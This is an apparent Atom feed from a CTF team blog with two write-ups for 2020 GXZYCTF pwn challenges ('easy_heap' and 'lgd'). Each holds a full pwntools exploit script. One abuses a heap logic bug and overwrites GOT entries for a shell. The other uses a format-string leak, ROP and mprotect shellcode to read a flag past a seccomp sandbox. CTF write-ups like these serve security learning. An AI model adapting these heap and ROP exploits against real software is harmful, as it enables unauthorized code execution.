<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOI Team</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://boiteam.github.io/"/>
  <updated>2020-03-22T04:04:02.726Z</updated>
  <id>https://boiteam.github.io/</id>
  
  <author>
    <name>BOI Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 GXZYCTF easy_heap</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_easy_heap/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_easy_heap/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:02.726Z</updated>
    
    <content type="html"><![CDATA[<p>add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">01</span>:<span class="number">14</span>:<span class="number">58</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./easyheap'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"How long is this message?"</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> size &lt; <span class="number">0x400</span>:</span><br><span class="line">        sf(<span class="string">"What is the content of the message?"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"What is the index of the item to be deleted?"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"What is the index of the item to be modified?"</span>,str(idx))</span><br><span class="line">    sf(<span class="string">"What is the content of the message?"</span>,content)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"123"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x401</span>,<span class="string">"aa"</span>)</span><br><span class="line">    add(<span class="number">0x401</span>,<span class="string">"aa"</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"\x20"</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0602018</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x400670</span>))</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">"\n"</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]) - <span class="number">0x3c4c20</span></span><br><span class="line">    ShowAddress(<span class="string">"libc"</span>,libc_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0602050</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">    edit(<span class="number">2</span>,p64(libc_addr + <span class="number">0x45390</span>))</span><br><span class="line">    #dele(<span class="number">1</span>)</span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84

    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_logic" scheme="https://boiteam.github.io/tags/Pwn-logic/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF lgd</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_lgd/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_lgd/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:03:32.937Z</updated>
    
    <content type="html"><![CDATA[<p>有沙盒功能，使用seccomp-tools dump ./pwn<br>之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Sat Mar  <span class="number">7</span> <span class="number">09</span>:<span class="number">36</span>:<span class="number">57</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    slf(<span class="string">"\n"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    slf(<span class="string">"\n"</span>,str(idx))</span><br><span class="line">    sf(<span class="string">"___c___r__s__++___c___new_content ?"</span>,content)</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    slf(<span class="string">"\n"</span>,<span class="string">"sofr_is_cool"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>]) - <span class="number">0x3c4c08</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)#<span class="number">1</span></span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>)+p64(libc_addr+<span class="number">0x3c4b50</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(<span class="number">0x81</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">2</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">200</span>)#<span class="number">4</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">"n"</span>*<span class="number">0x60</span>)#<span class="number">5</span></span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(<span class="number">0x6033c0</span>))</span><br><span class="line">    edit(<span class="number">3</span>,p64(<span class="number">0x55800</span>+libc_addr))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">"%6$p|"</span>)</span><br><span class="line">    dele(<span class="number">4</span>)</span><br><span class="line">    stack_addr = int(ru(<span class="string">"|"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    shellcode = shellcraft.amd64.linux.cat(<span class="string">'./flag'</span>)</span><br><span class="line">    #shellcode = shellcraft.amd64.pushstr(<span class="string">"./flag"</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.open(<span class="string">'rsp'</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.read(<span class="string">'rax'</span>,<span class="string">'rsp'</span>,<span class="number">0</span>)</span><br><span class="line">    #shellcode += shellcraft.amd64.linux.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line">    print len(shellcode)</span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0x00000000006032f0</span>)+p64(libc_addr+<span class="number">0x3c67a8</span>)+p64(stack_addr+<span class="number">0x48</span>)+p64(<span class="number">0x603260</span>)+p64(libc_addr+libc.symbols[<span class="string">'mprotect'</span>])+shellcode)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0x0000040000000400</span>)*<span class="number">10</span>)</span><br><span class="line">    debug()</span><br><span class="line">    file_p = <span class="number">0x603360</span></span><br><span class="line">    edit(<span class="number">4</span>,p64(<span class="number">0x4023AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x603310</span>)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x00603000</span>)+p64(<span class="number">0x402390</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x603318</span>))</span><br><span class="line">    #dele(<span class="number">1</span>)</span><br><span class="line">    #dele(<span class="number">0</span>)</span><br><span class="line">    ShowAddress(<span class="string">"libc_addr"</span>,libc_addr)</span><br><span class="line">    ShowAddress(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line">    debug()</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有沙盒功能，使用seccomp-tools dump ./pwn&lt;br&gt;之后利用栈上EIP，构造读取文件的ROP，或者改变页权限，写读取文件flag。&lt;/p&gt;
&lt;figure class=&quot;highlight clean&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;#coding=utf&lt;span 